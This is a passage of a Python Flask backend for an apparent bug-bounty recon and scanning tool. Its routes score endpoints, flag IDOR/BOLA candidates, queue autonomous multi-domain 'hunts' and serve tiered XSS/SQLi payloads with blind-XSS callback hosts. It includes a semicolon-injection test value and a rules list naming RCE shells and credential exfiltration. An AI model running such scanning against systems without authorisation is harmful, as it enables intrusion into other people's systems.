        "has_scheme_bug": has_scheme,
        "source":         "BXSS_HOST env" if os.environ.get("BXSS_HOST") else
                          "OOB_HOST env"  if os.environ.get("OOB_HOST")  else
                          "interactsh",
        "note":           "Host must be a bare hostname like 'abc123.ezz.hak.monster'",
    })



@app.route("/system/runtime_audit")
def system_runtime_audit():
    """
    GET /system/runtime_audit

    Audits current runtime for known hang risks:
    - stages stuck in 'run' beyond their budget
    - recent slow routes
    - whether safe wrappers are available
    Returns structured JSON — never runs external tools.
    """
    import sqlite3 as _sa, time as _ta, re as _ra

    now = _ta.time()

    # ── Check stuck stages across all known domains ───────────────────────────
    BUDGETS = {
        "js_collect": 180, "js_deep": 180, "oob": 15, "oob_setup": 15,
        "auth_scan": 240, "test": 60, "screenshots": 180, "fingerprint": 300,
        "crawl": 3600, "dirbust": 3600, "subdomains": 900, "active": 600,
    }
    stages_running_too_long = []
    try:
        conn = _sa.connect(db.db_path, timeout=0.5)
        conn.execute("PRAGMA query_only=ON")
        rows = conn.execute(
            "SELECT d.domain, rs.step, rs.state, rs.updated_at "
            "FROM recon_steps rs JOIN domains d ON d.id=rs.domain_id "
            "WHERE rs.state='run'"
        ).fetchall()
        conn.close()
        for domain, step, state, ts in rows:
            try:
                age = round(now - float(ts), 1)
            except Exception:
                age = None
            budget = BUDGETS.get(step)
            if budget and age and age > budget:
                stages_running_too_long.append({
                    "domain": domain, "stage": step,
                    "age_s": age, "budget_s": budget,
                    "over_by_s": round(age - budget, 1),
                })
    except Exception:
        pass

    # ── Scan recon.py for remaining unsafe patterns ───────────────────────────
    unsafe_popen     = 0
    unsafe_wait      = 0
    unsafe_threadpool= 0
    try:
        recon_src = open("recon.py").read()
        # Count Popen calls that lack start_new_session (can't kill process group)
        unsafe_popen = len(_ra.findall(
            r'subprocess\.Popen\([^)]*\)',
            recon_src
        ))
        # Subtract those that DO have start_new_session=True
        safe_popen   = len(_ra.findall(r'start_new_session=True', recon_src))
        unsafe_popen = max(0, unsafe_popen - safe_popen)
        # wait() with timeout > 600s
        unsafe_wait       = len(_ra.findall(r'proc\.wait\(timeout=(?:[6-9]\d\d|[1-9]\d{3,})', recon_src))
        # with ThreadPoolExecutor that could block on shutdown
        # Count unsafe with-blocks in BOTH pipeline files
        _scanner_src = open("scanner.py").read()
        unsafe_threadpool = (
            len(_ra.findall(r'with.*ThreadPoolExecutor.*as\s+\w+:', recon_src)) +
            len(_ra.findall(r'with.*ThreadPoolExecutor.*as\s+\w+:', _scanner_src))
        )
    except Exception:
        pass

    # ── Check safe_proc wrapper available ────────────────────────────────────
    safe_wrappers_ok = False
    try:
        from engine.safe_proc import safe_run_process, safe_thread_pool, finalize_stage
        safe_wrappers_ok = True
    except Exception:
        pass

    return jsonify({
        "safe_process_wrapper_used":  safe_wrappers_ok,
        "safe_future_wrapper_used":   safe_wrappers_ok,
        "scanner_T_undefined":        ("T.get(" in open("scanner.py").read().split("T[0-9A-Z]")[0]),
        "stages_running_too_long":    stages_running_too_long,
        "routes_over_5s":             [r for r in _SLOW_LOG if r.get("duration_s",0) > 5],
        "recent_slow_routes":         _SLOW_LOG[-10:],
        "unsafe_analysis": {
            "note":                  "Analysis of recon.py patterns",
            "popen_without_session": unsafe_popen,
            "wait_over_600s":        unsafe_wait,
            "with_threadpool_blocks": unsafe_threadpool,
        },
        "oob_host_ok": (lambda: (lambda h: bool(h and 'http://' not in h and 'https://' not in h and re.match(r'^[a-z0-9][a-z0-9.\-]+\.[a-z]{2,}$', h)))(
            # Try env first, then try to get from interactsh engine
            (lambda raw: re.sub(r'^https?://', '', raw).rstrip('/') if raw else
             (lambda: getattr(__import__('engine.oob', fromlist=['get_oob_host']), 'get_oob_host', lambda: '')())()
            )(re.sub(r'^https?://', '', (os.environ.get("BXSS_HOST","") or os.environ.get("OOB_HOST","") or "")).rstrip('/'))
        ))(),
        "active_tech_cached": True,  # get_tech_fast is DB-read only
        "domain_validation_ok": (
            _domain("verce;.com") == "" and
            _domain("vercel.com") == "vercel.com"
        ),
    })


@app.route("/system/health")
def system_health():
    """
    GET /system/health
    Overall system readiness. Uses the same _which() validator as recon
    so tool status here matches what recon actually uses.
    """
    import time as _ht
    t0 = _ht.time()

    # ── DB ────────────────────────────────────────────────────────────────────
    db_ok = False
    db_err = None
    db_latency_ms = None
    try:
        _db_t0 = time.time()
        db.count_endpoints("__health_check__")
        db_latency_ms = round((time.time() - _db_t0) * 1000, 1)
        db_ok = True
    except Exception as e:
        db_err = str(e)

    # ── Tools — validated via the same _which() recon uses ───────────────────
    # These are the tools that matter most for pipeline operation
    KEY_TOOLS = {
        "httpx":      "live host probing",
        "nuclei":     "vulnerability scanning",
        "subfinder":  "subdomain discovery",
        "katana":     "web crawling",
        "dnsx":       "DNS resolution",
        "gau":        "URL collection",
        "ffuf":       "directory bruteforce",
        "nuclei":     "nuclei scanning",
    }
    tools_status = {}
    try:
        from recon import _which as _rwhich
        for t, role in KEY_TOOLS.items():
            path = _rwhich(t)
            tools_status[t] = {"found": bool(path), "path": path, "role": role}
    except Exception:
        import shutil
        for t, role in KEY_TOOLS.items():
            p = shutil.which(t)
            tools_status[t] = {"found": bool(p), "path": p, "role": role}

    tools_ok      = any(v["found"] for v in tools_status.values())
    core_tools_ok = all(tools_status.get(t, {}).get("found")
                        for t in ["httpx","nuclei","subfinder"])

    # ── Export directory writable ─────────────────────────────────────────────
    export_ok  = False
    export_err = None
    try:
        _ep = Path(__file__).parent / "data" / "exports"
        _ep.mkdir(parents=True, exist_ok=True)
        export_ok = os.access(str(_ep), os.W_OK)
        if not export_ok:
            export_err = "data/exports not writable"
    except Exception as e:
        export_err = str(e)

    # ── Nuclei templates ──────────────────────────────────────────────────────
    nuclei_ok    = False
    nuclei_count = 0
    try:
        from engine.nuclei_engine import get_binary as _gnb
        _nb = _gnb()
        if _nb:
            import subprocess as _nsp
            _nr = _nsp.run([_nb, "-version"], capture_output=True, text=True, timeout=5)
            nuclei_ok = "nuclei" in (_nr.stdout + _nr.stderr).lower()
    except Exception:
        pass

    # ── Queue workers alive ───────────────────────────────────────────────────
    import threading as _thr
    worker_threads = [t for t in _thr.enumerate() if "scan-queue-worker" in t.name]
    pipeline_ok    = len(worker_threads) > 0
    pipeline_err   = None if pipeline_ok else "no scan-queue-worker threads running"

    # ── Domain validation working ─────────────────────────────────────────────
    validation_ok = (_domain("verce;.com") == "" and _domain("vercel.com") == "vercel.com")

    ready = db_ok and export_ok and pipeline_ok

    return jsonify({
        "db_ok":            db_ok,
        "db_error":         db_err,
        "db_latency_ms":    db_latency_ms,
        "db_latency_warn":  db_latency_ms is not None and db_latency_ms > 100,
        "tools_ok":         tools_ok,
        "core_tools_ok":    core_tools_ok,
        "tools":            tools_status,
        "export_ok":        export_ok,
        "export_error":     export_err,
        "nuclei_ok":        nuclei_ok,
        "pipeline_ok":      pipeline_ok,
        "pipeline_error":   pipeline_err,
        "domain_validation_ok": validation_ok,
        "workers":          len(worker_threads),
        "ready":            ready,
        "fail_reasons": [r for r in [
            db_err,
            export_err,
            pipeline_err,
            None if tools_ok else "no tools found in PATH or go/bin",
        ] if r],
        "elapsed_ms":  round((_ht.time()-t0)*1000, 1),
        "timestamp":   int(_ht.time()),
    })



# ══════════════════════════════════════════════════════════════════════════════
# ULTIMATE RECON ENGINE v2 — Param-level scoring, per-endpoint test plans,
# chain detection, hidden endpoint expansion, signal routing.
#
# Extends v1 (surface_intel + elite_recon) with param-level intelligence.
# HARD RULES: no auto-exploit, no auto-submit, safe analysis only.
# ══════════════════════════════════════════════════════════════════════════════

def _v2_data(domain: str) -> dict:
    """Load endpoints and run the full v2 intelligence pass."""
    from engine.elite_recon_v2 import analyse_domain
    eps_raw = db.get_endpoints(domain, limit=50000) or []
    eps     = [e if isinstance(e, str) else e.get("url", "") for e in eps_raw]
    eps     = [u for u in eps if u]
    return analyse_domain(domain, eps)


@app.route("/elitev2/targets")
def elitev2_targets():
    """
    Phase 1 — Param-level scored target list.
    GET /elitev2/targets?domain=X&min_score=6&limit=50

    Returns every endpoint scored by param names and path structure.
    Score 9-10 → full_scan, 6-8 → targeted_scan, 1-5 → passive_only.
    """
    d         = _domain(request.args.get("domain", ""))
    min_score = int(request.args.get("min_score", "1"))
    limit     = min(int(request.args.get("limit", "50")), 200)
    if not d:
        return jsonify({"error": "domain required"}), 400

    data    = _v2_data(d)
    targets = [t for t in data["all_scored"] if t["score"] >= min_score]

    return jsonify({
        "domain":             d,
        "total":              len(targets),
        "high_value_targets": data["high_value_targets"],
        "targets":            targets[:limit],
        "routing_summary":    data["routing_summary"],
        "expected_bounty":    data["expected_bounty"],
        "stats":              data["stats"],
    })


@app.route("/elitev2/chains")
def elitev2_chains():
    """
    Phase 2 — API chain detection with IDOR/BOLA candidates.
    GET /elitev2/chains?domain=X

    Normalises /users/123 → /users/{id}, groups by template,
    and infers IDOR / BOLA / auth-bypass bug classes per chain.
    """
    from engine.elite_recon_v2 import detect_chains_v2, expand_hidden
    d = _domain(request.args.get("domain", ""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    eps_raw = db.get_endpoints(d, limit=50000) or []
    eps     = [e if isinstance(e, str) else e.get("url", "") for e in eps_raw]
    eps     = [u for u in eps if u]

    chains = detect_chains_v2(eps)

    # Add hidden expansions for top-5 chain endpoints
    expansions: List[Dict] = []
    for cand in chains["candidates"][:5]:
        for ep_url in cand["endpoints"][:2]:
            expansions.extend(expand_hidden(ep_url))

    return jsonify({
        "domain":         d,
        "total_chains":   chains["total"],
        "candidates":     chains["candidates"],
        "hidden_variants": expansions[:30],
        "note":           "IDOR/BOLA candidates — manual testing required, no auto-exploit",
    })


@app.route("/elitev2/plan")
def elitev2_plan():
    """
    Phase 3 — Per-endpoint safe test plans.
    GET /elitev2/plan?domain=X&url=<specific_url>  (url= optional)

    Without url= → generates plans for all high-value endpoints.
    With url=    → generates plans for that specific endpoint.
    """
    from engine.elite_recon_v2 import generate_test_plan, score_endpoint, classify_endpoint
    d = _domain(request.args.get("domain", ""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    specific_url = request.args.get("url", "").strip()

    if specific_url:
        plans   = generate_test_plan(specific_url)
        score   = score_endpoint(specific_url)
        surfs   = classify_endpoint(specific_url)
        return jsonify({
            "domain":    d,
            "url":       specific_url,
            "score":     score,
            "surfaces":  surfs,
            "plans":     plans,
            "plan_count": len(plans),
            "note":      "Safe manual test steps only. No auto-exploitation.",
        })

    # Full domain plan
    data = _v2_data(d)
    return jsonify({
        "domain":            d,
        "high_value_targets": data["high_value_targets"],
        "expected_bounty":    data["expected_bounty"],
        "test_plans":         data["test_plans"],
        "test_plan_count":    len(data["test_plans"]),
        "hidden_expansions":  data["hidden_expansions"],
        "note":               "Safe manual test steps only. No auto-exploitation.",
    })


@app.route("/elitev2/debug")
def elitev2_debug():
    """
    Phase 4 — Full v2 intelligence debug dashboard.
    GET /elitev2/debug?domain=X

    Returns complete analysis: scores, chains, plans, routing, stats.
    """
    d = _domain(request.args.get("domain", ""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    data = _v2_data(d)

    log.info(
        f"[elitev2] debug domain={d}"
        f" high_value={data['high_value_targets']}"
        f" chains={data['chains']['total']}"
        f" plans={len(data['test_plans'])}"
        f" bounty={data['expected_bounty']}"
    )

    return jsonify({
        "domain":               d,
        "high_value_targets":   data["high_value_targets"],
        "expected_bounty":      data["expected_bounty"],
        "routing_summary":      data["routing_summary"],
        "stats":                data["stats"],
        "top_targets":          data["top_targets"][:10],
        "chains_found":         data["chains"]["total"],
        "top_chains":           data["chains"]["candidates"][:5],
        "test_plan_count":      len(data["test_plans"]),
        "sample_plans":         data["test_plans"][:3],
        "hidden_expansions":    len(data["hidden_expansions"]),
        "sample_expansions":    data["hidden_expansions"][:3],
        "elapsed_s":            data["elapsed_s"],
        "note":                 data["note"],
        "v2_loaded":            True,
    })



@app.route("/debug/domain_validate")
def debug_domain_validate():
    """
    GET /debug/domain_validate?domain=X

    Tests domain validation without starting any pipeline.
    Returns HTTP 200 if valid, HTTP 400 if invalid, with clear reason.

    Use this to test before running recon.
    """
    raw    = request.args.get("domain", "").strip()
    parsed = _domain(raw)

    if not parsed:
        # Diagnose the specific rejection reason
        import urllib.parse as _ulp
        decoded = _ulp.unquote(raw).strip().lower()
        decoded = re.sub(r'^https?://', '', decoded).split('/')[0].split('?')[0]

        if re.search(r'[;|&<>"\'\s\x00-\x1f]', decoded):
            reason = "invalid_characters"
        elif '*' in decoded:
            reason = "wildcard_not_allowed"
        elif decoded in ("localhost","localhost.local"):
            reason = "localhost_not_allowed"
        elif re.match(r'^127\.', decoded) or re.match(r'^0\.0\.0', decoded):
            reason = "loopback_ip_not_allowed"
        elif re.match(r'^\d{1,3}(\.\d{1,3}){3}$', decoded):
            reason = "bare_ip_not_allowed"
        elif not re.match(r'^[a-z0-9][a-z0-9.\-]*\.[a-z]{2,}$', decoded):
            reason = "not_a_valid_hostname"
        else:
            reason = "unknown_validation_failure"

        return jsonify({
            "valid":         False,
            "input":         raw,
            "decoded":       decoded,
            "reason":        reason,
            "error":         "invalid_domain",
            "hint":          "Use a clean fully-qualified domain like 'example.com'",
        }), 400

    return jsonify({
        "valid":         True,
        "input":         raw,
        "domain":        parsed,
        "ready_for_recon": True,
    })



# ══════════════════════════════════════════════════════════════════════════════
# AUTO-HUNT ENGINE v2 — Autonomous hunt API
# All routes are < 200ms — they only read from DB / in-memory registry.
# All heavy work runs in background worker threads.
# ══════════════════════════════════════════════════════════════════════════════

def _get_hunt_engine():
    """Get the singleton AutoHuntEngine, initialising it if needed."""
    from engine.auto_hunt_v2 import get_engine
    return get_engine(db)


@app.route("/hunt/submit", methods=["POST"])
def hunt_submit():
    """
    POST {"domain":"example.com","priority":1,"phases":["surface","endpoints","vuln"]}

    Queues a domain for autonomous hunting.
    Returns immediately with job_id — work runs in background.
    Response time: < 5ms
    """
    p       = request.get_json(silent=True, force=True) or {}
    raw     = p.get("domain","") or request.args.get("domain","")
    domain  = _domain(raw)
    if not domain:
        return jsonify({"error":"invalid_domain","input":raw}), 400

    priority = min(max(int(p.get("priority",5)),1),10)
    phases   = p.get("phases") or ["surface","endpoints","intelligence","vuln"]
    bugs     = p.get("bugs") or []
    force    = bool(p.get("force", False))

    engine   = _get_hunt_engine()
    job_id   = engine.submit(domain, priority=priority,
                              phases=phases, bugs=bugs, force=force)

    return jsonify({
        "ok":       True,
        "job_id":   job_id,
        "domain":   domain,
        "priority": priority,
        "phases":   phases,
        "queue":    engine.queue_depth(),
    })


@app.route("/hunt/bulk", methods=["POST"])
def hunt_bulk():
    """
    POST {"domains":["a.com","b.com"],"priority":3}

    Queue multiple domains in one call.
    Response time: < 10ms
    """
    p       = request.get_json(silent=True, force=True) or {}
    raw_list = p.get("domains",[])
    priority = min(max(int(p.get("priority",5)),1),10)
    engine  = _get_hunt_engine()

    queued = []
    skipped = []
    for raw in raw_list[:500]:  # cap to 500 per bulk call
        d = _domain(str(raw))
        if d:
            jid = engine.submit(d, priority=priority)
            queued.append({"domain":d,"job_id":jid})
        else:
            skipped.append(raw)

    return jsonify({
        "ok":      True,
        "queued":  len(queued),
        "skipped": len(skipped),
        "jobs":    queued,
        "queue":   engine.queue_depth(),
    })


@app.route("/hunt/status")
def hunt_status():
    """
    GET /hunt/status?job_id=j_abc123

    Returns job status + results. DB read only — always < 5ms.
    """
    job_id = request.args.get("job_id","").strip()
    engine = _get_hunt_engine()

    if job_id:
        status = engine.job_status(job_id)
        if not status:
            return jsonify({"error":"job_not_found","job_id":job_id}), 404
        return jsonify(status)

    # No job_id → return queue overview
    return jsonify({
        "queue": engine.queue_depth(),
        "recent": engine.list_jobs()[:20],
    })


@app.route("/hunt/jobs")
def hunt_jobs():
    """
    GET /hunt/jobs?status=running&limit=50

    List all jobs filtered by status.
    Response time: < 10ms
    """
    engine       = _get_hunt_engine()
    status_filter = request.args.get("status","")
    limit         = min(int(request.args.get("limit","50")), 200)
    jobs          = engine.list_jobs(status_filter or None)
    return jsonify({
        "total":  len(jobs),
        "jobs":   jobs[:limit],
        "queue":  engine.queue_depth(),
    })


@app.route("/hunt/results")
def hunt_results():
    """
    GET /hunt/results?domain=X&severity=high

    Read findings from DB — not from the job directly.
    Always < 10ms.
    """
    d   = _domain(request.args.get("domain",""))
    sev = request.args.get("severity","").strip().lower()
    lim = min(int(request.args.get("limit","100")), 500)
    if not d:
        return jsonify({"error":"domain required"}), 400

    findings = db.get_findings(d) or []
    if sev:
        findings = [f for f in findings if f.get("severity","").lower() == sev]
    findings.sort(key=lambda f: {
        "critical":4,"high":3,"medium":2,"low":1,"info":0
    }.get(f.get("severity","").lower(), 0), reverse=True)

    return jsonify({
        "domain":   d,
        "total":    len(findings),
        "findings": findings[:lim],
        "counts": {
            "critical": sum(1 for f in findings if f.get("severity","").lower()=="critical"),
            "high":     sum(1 for f in findings if f.get("severity","").lower()=="high"),
            "medium":   sum(1 for f in findings if f.get("severity","").lower()=="medium"),
        }
    })


@app.route("/hunt/queue")
def hunt_queue():
    """
    GET /hunt/queue

    Returns queue depth and worker status.
    Response time: < 1ms
    """
    engine = _get_hunt_engine()
    return jsonify({
        "queue":       engine.queue_depth(),
        "max_workers": engine.max_workers,
        "running":     [j for j in engine.list_jobs("running")],
    })


@app.route("/pipeline/debug")
def pipeline_debug():
    """
    Full pipeline state for a domain — every connection point visible.
    GET /pipeline/debug?domain=example.com

    Returns exactly what each phase would see:
      endpoints_db, endpoints_files, scanner_used_fallback,
      nuclei_targets, payload_v2_active, eil_validations, reports_generated
    """
    from pathlib import Path
    import glob

    d = _domain(request.args.get("domain", ""))
    if not d:
        return jsonify({"error": "domain required"}), 400

    # Phase 1: DB endpoints
    ep_db = db.get_endpoints(d, limit=50000)
    ep_db_count = len(ep_db) if ep_db else 0

    # Phase 2: file endpoints
    export_dir = Path(__file__).parent / "data" / "exports" / d
    ep_files_count = 0
    ep_files_detail: dict = {}
    if export_dir.exists():
        for fp in export_dir.glob(f"{d}_*.txt"):
            lines = [l.strip() for l in fp.read_text(errors="replace").splitlines()
                     if l.strip().startswith("http")]
            ep_files_detail[fp.name] = len(lines)
            ep_files_count += len(lines)

    # Phase 3: payload v2 active
    try:
        from engine.payload_manager import select_payloads_v2 as _v2check
        _test = _v2check("xss", mode="normal")
        pv2_active = len(_test) > 0
        pv2_sample = len(_test)
    except Exception:
        pv2_active, pv2_sample = False, 0

    # Phase 4: nuclei targets (replicate scoring logic)
    _nuclei_target_count = 0
    _nuclei_source = "none"
    _candidates = ep_db or []
    if not _candidates and export_dir.exists():
        _fp2 = export_dir / f"{d}_crawled.txt"
        if _fp2.exists():
            _candidates = [l.strip() for l in _fp2.read_text().splitlines()
                           if l.strip().startswith("http")]
            _nuclei_source = "file"
    else:
        _nuclei_source = "db" if _candidates else "empty"
    _hv = [u for u in _candidates if any(p in u.lower() for p in
           ['?','=','/api/','/admin','/login','/upload','/oauth'])]
    if len(_hv) >= 100:
        _nuclei_target_count = max(50, int(len(_hv) * 0.30))
    else:
        _nuclei_target_count = len(_hv)

    # Phase 6: EIL validations (findings that passed EIL)
    findings = db.get_findings(d) or []
    eil_confirmed = sum(1 for f in findings if f.get("eil_confirmed"))
    needs_review  = sum(1 for f in findings if f.get("status") == "needs_review")

    # Phase 7: reports generated
    report_dir = Path(__file__).parent / "data" / "reports" / d
    report_files = list(report_dir.glob("scan_*.json")) if report_dir.exists() else []

    # Bounty reports (from bounty_db)
    bounty_stats: dict = {}
    try:
        from engine.bounty_db import get_stats as _bstats, list_reports as _breports
        bounty_stats = _bstats()
        bounty_by_domain = _breports(domain=d, limit=500)
        _bdom_by_status: dict = {}
        for br in bounty_by_domain:
            s = br.get("status","")
            _bdom_by_status[s] = _bdom_by_status.get(s, 0) + 1
    except Exception:
        bounty_by_domain = []
        _bdom_by_status  = {}

    # Recon step status
    steps = db.get_steps(d) if hasattr(db, "get_steps") else {}

    return jsonify({
        "domain": d,
        "phase1_recon": {
            "step_status":     steps,
            "endpoints_db":    ep_db_count,
            "hosts_db":        len(db.get_hosts(d).get("active", [])),
        },
        "phase2_scanner": {
            "endpoints_db":          ep_db_count,
            "endpoints_files":        ep_files_count,
            "scanner_used_fallback":  ep_db_count == 0 and ep_files_count > 0,
            "files_detail":           ep_files_detail,
            "export_dir":             str(export_dir),
        },
        "phase3_payload_v2": {
            "active":          pv2_active,
            "test_xss_count":  pv2_sample,
        },
        "phase4_nuclei": {
            "endpoints_input":   len(_candidates),
            "nuclei_source":     _nuclei_source,
            "high_value_targets": _nuclei_target_count,
            "would_skip":        _nuclei_target_count == 0,
        },
        "phase6_eil": {
            "total_findings":  len(findings),
            "eil_confirmed":   eil_confirmed,
            "needs_review":    needs_review,
        },
        "phase7_reports": {
            "reports_generated": len(report_files),
            "report_dir":        str(report_dir),
            "latest":            str(sorted(report_files)[-1]) if report_files else None,
        },
        "bounty_reports": {
            "domain_reports":    len(bounty_by_domain),
            "by_status":         _bdom_by_status,
            "ready_for_review":  _bdom_by_status.get("ready_for_review", 0),
            "needs_review":      _bdom_by_status.get("needs_review", 0),
            "approved":          _bdom_by_status.get("approved", 0),
            "submitted":         _bdom_by_status.get("submitted", 0) +
                                  _bdom_by_status.get("triaged", 0),
            "total_payout":      bounty_stats.get("total_bounty", 0),
            "global_stats":      bounty_stats,
        },
        "export": {
            "healthy":             ep_files_count > 0,
            "last_export_count":   ep_files_count,
            "last_export_reason":  "files_on_disk",
            "out_dir":             str(export_dir),
            "files_detail":        ep_files_detail,
            "export_save_url":     f"/endpoints/export/save?domain={d}&force=1",
        },
        "subdomain_export": {
            "healthy":            (export_dir / f"{d}_subdomains_unique.txt").exists(),
            "last_export_count":  (
                len([l for l in (export_dir / f"{d}_subdomains_unique.txt")
                     .read_text().splitlines() if l.strip()])
                if (export_dir / f"{d}_subdomains_unique.txt").exists()
                else len(db.get_subs(d) or [])
            ),
            "last_export_reason": (
                "files_on_disk" if (export_dir / f"{d}_subdomains_unique.txt").exists()
                else "not_yet_exported"
            ),
            "files_written":      len(list(export_dir.glob("*_subdomains_*")))
                                  if export_dir.exists() else 0,
            "out_dir":            str(export_dir),
            "export_save_url":    f"/subdomains/export/save?domain={d}&force=1",
        },
        "limits": {
            "max_subs":       50000,
            "live_hosts_cap": 2000,
            "probe_queue":    "max_live (score-ordered)",
            "js_cap":         2000,
            "js_budget_s":    120,
            "crawl_cap":      200000,
            "note": "Collection uncapped. Probe/JS/crawl capped for performance.",
        },
        "tool_health": {
            "critical_ok":   all(
                bool(__import__("shutil").which(t) or
                     any(os.path.isfile(f"{p}/{t}")
                         for p in [os.path.expanduser("~/go/bin"),
                                   "/home/kali/go/bin","/usr/local/bin"]))
                for t in ["httpx","nuclei","subfinder"]
            ),
            "ok_count":      None,
            "broken_count":  None,
            "missing_count": None,
            "warnings":      [],
            "last_checked":  None,
            "check_url":     "/tools/doctor?critical=1",
            "full_check_url":"/tools/doctor",
            "fix_url":       "/tools/fix_script",
            "note":          "GET /tools/doctor for real execution test of all 86 tools",
        },
        "runtime_health": {
            "slow_routes":      _SLOW_LOG[-5:],
            "blocking_routes":  [r for r in _SLOW_LOG if r["duration_s"] > 10],
            "tool_doctor_ok":   bool(_DOCTOR_CACHE),
            "active_tech_ok":   not any("/active_tech" in r["path"] and r["duration_s"] > 2
                                        for r in _SLOW_LOG),
            "oob_host_valid":   bool(re.match(
                r'^[a-z0-9][a-z0-9.\-]+\.[a-z]{2,}$',
                re.sub(r'^https?://', '',
                       (os.environ.get("BXSS_HOST","") or
                        os.environ.get("OOB_HOST","") or "")).rstrip('/') or ""
            )),
            "slow_route_count": len(_SLOW_LOG),
            "check_url":        "/system/slow_routes",
        },
        "pipeline_status": {
            "recon_done":       ep_db_count > 0,
            "scanner_ready":    ep_db_count > 0 or ep_files_count > 0,
            "nuclei_ready":     _nuclei_target_count > 0,
            "export_ok":        ep_files_count > 0,
            "findings_exist":   len(findings) > 0,
            "reports_exist":    len(report_files) > 0,
            "bounty_drafts":    len(bounty_by_domain) > 0,
            "pipeline_ok":      (ep_db_count > 0 or ep_files_count > 0),
            "fail_reason": (
                None if ep_db_count > 0
                else "no_endpoints_in_db" if ep_files_count == 0
                else "endpoints_in_files_only_db_empty"
            ),
        },
    })


@app.route("/payloads/v2/source_health")
def payloads_v2_source_health():
    """
    Payload source health — shows exact files scanned, lines loaded, failures.
    GET /payloads/v2/source_health

    Returns:
      files_found:    list of {path, file, raw_lines, clean_lines}
      lines_loaded:   {tag: count} per tag
      failed_sources: [(tag, path, reason)] — explicit, never silent
      last_fetch_error: last network error string
    """
    from engine.payload_manager import get_source_health
    return jsonify(get_source_health())


@app.route("/payloads/v2/rebuild", methods=["POST"])
def payloads_v2_rebuild():
    """
    Force full cache rebuild from all sources (local + network).
    POST /payloads/v2/rebuild
    Runs synchronously — returns after rebuild completes.

    [payloads] cache built: N tags, M total payloads in Xs
    """
    from engine.payload_manager import _ensure_cache, get_source_health, get_stats
    _ensure_cache(force=True)
    health = get_source_health()
    stats  = get_stats()
    log.info(
        f"[payloads] rebuild complete: {stats['total_tags']} tags,"
        f" {stats['total_payloads']} payloads,"
        f" {health['files_found_count']} files,"
        f" {health['failed_count']} failed"
    )
    return jsonify({
        "status":         "rebuilt",
        "total_tags":     stats["total_tags"],
        "total_payloads": stats["total_payloads"],
        "files_found":    health["files_found_count"],
        "tags_loaded":    health["tags_loaded_count"],
        "failed_sources": health["failed_sources"],
    })


@app.route("/payloads/v2/budget")
def payloads_v2_budget():
    """
    Active budget configuration for all payload selection modes.
    GET /payloads/v2/budget

    Returns exact slot counts and percentages per mode.
    Scanner always uses mode=normal unless explicitly changed.
    """
    from engine.payload_manager import get_budget_config
    return jsonify({
        "active_scanner_mode": "normal",
        "modes": get_budget_config(),
        "note": "Scanner check_* functions always use mode=normal. "
                "Use /payloads/v2/select?mode=deep for deep scanning.",
    })



# ── Payload safe API (aliases the v2 system with safe-tier enforcement) ───────

@app.route("/payloads/safe/list")
def payloads_safe_list():
    """
    GET /payloads/safe/list?bug_type=sqli&mode=normal&limit=30

    Returns safe-tier payloads for a given bug type.
    mode=normal  → safe only, max 30
    mode=deep    → safe+low_risk, max 100
    mode=lab     → safe+low_risk+lab_only, max 200

    Payloads are structured objects — never raw strings — with:
      payload, bug_type, risk_tier, family, description, confidence, source

    [payloads] selected bug=sqli mode=normal count=30 risk=safe
    """
    from engine.payload_manager import select_safe_payloads
    bug_type = request.args.get("bug_type", "sqli").strip().lower()
    mode     = request.args.get("mode", "normal").strip().lower()
    limit    = request.args.get("limit", None)
    url      = request.args.get("url", "")
    param    = request.args.get("param", "")

    if mode not in ("normal", "deep", "lab"):
        mode = "normal"
    if limit:
        try: limit = int(limit)
        except: limit = None

    payloads = select_safe_payloads(bug_type=bug_type, mode=mode,
                                    limit=limit, url=url, param=param)

    # Enrich with description field for the response
    enriched = []
    for p in payloads:
        enriched.append({
            "payload":     p.get("payload", ""),
            "bug_type":    bug_type,
            "risk_tier":   p.get("risk_tier", "safe"),
            "family":      p.get("family", ""),
            "description": p.get("reason", "safe detection probe"),
            "confidence":  p.get("confidence", 0.5),
            "source":      p.get("source", "payload_manager"),
        })

    return jsonify({
        "bug_type": bug_type,
        "mode":     mode,
        "count":    len(enriched),
        "tiers_allowed": {
            "normal": ["safe"],
            "deep":   ["safe", "low_risk"],
            "lab":    ["safe", "low_risk", "lab_only"],
        }.get(mode, ["safe"]),
        "payloads": enriched,
    })


@app.route("/payloads/safe/stats")
def payloads_safe_stats():
    """
    GET /payloads/safe/stats

    Returns payload inventory counts by bug_type, risk_tier, and family.
    Shows mode caps and tier definitions.

    [payloads] stats requested
    """
    from engine.payload_manager import safe_payload_stats
    stats = safe_payload_stats()
    return jsonify({
        **stats,
        "mode_caps": {
            "normal": {"limit": 30,  "tiers": ["safe"]},
            "deep":   {"limit": 100, "tiers": ["safe", "low_risk"]},
            "lab":    {"limit": 200, "tiers": ["safe", "low_risk", "lab_only"]},
        },
        "tier_definitions": {
            "safe":       "Probe/canary strings — no attack potential",
            "low_risk":   "Standard scanner payloads — no destructive operations",
            "lab_only":   "Aggressive probes — isolated lab use only",
            "lab_only_note": "Never used on production targets in normal/deep mode",
        },
        "rules": [
            "Normal scans: safe tier only (max 30)",
            "Deep scans: safe + low_risk (max 100)",
            "No destructive payloads ever",
            "No RCE shells",
            "No credential exfiltration",
            "No payloads in notifications",
        ],
    })


@app.route("/payloads/v2/health")
def payloads_v2_health_route():
    """
    Payload Intelligence v2 health panel.
    GET /payloads/v2/health
    """
    from engine.payload_manager import payloads_v2_health
    return jsonify(payloads_v2_health())


@app.route("/payloads/v2/select")
def payloads_v2_select():
    """
    v2 structured payload selection with source/family/confidence/reason.
    GET /payloads/v2/select?bug_type=sqli&param=id&url=...&mode=normal&debug=1

    debug=1 adds full internal breakdown:
      budget_target, candidate_counts, pre_dedupe_distribution,
      final_distribution, dedupe_removed, overflow_used

    [payload-v2] budget_applied mode=normal target={intel:12,pm:12,const:6} actual={...}
    """
    from engine.payload_manager import select_payloads_v2
    bug_type = request.args.get("bug_type", "sqli")
    param    = request.args.get("param", "")
    url      = request.args.get("url", "")
    mode     = request.args.get("mode", "normal")
    debug    = request.args.get("debug", "0") in ("1", "true", "yes")
    if mode not in ("normal", "deep", "lab"):
        mode = "normal"

    _debug_internals: dict = {} if debug else None
    payloads = select_payloads_v2(bug_type, url=url, param=param,
                                   mode=mode, _debug_out=_debug_internals)

    resp: dict = {
        "bug_type": bug_type,
        "param":    param,
        "mode":     mode,
        "count":    len(payloads),
        "payloads": payloads,
    }

    if debug and _debug_internals:
        resp["debug"] = _debug_internals

    return jsonify(resp)


@app.route("/payloads/v2/stats")
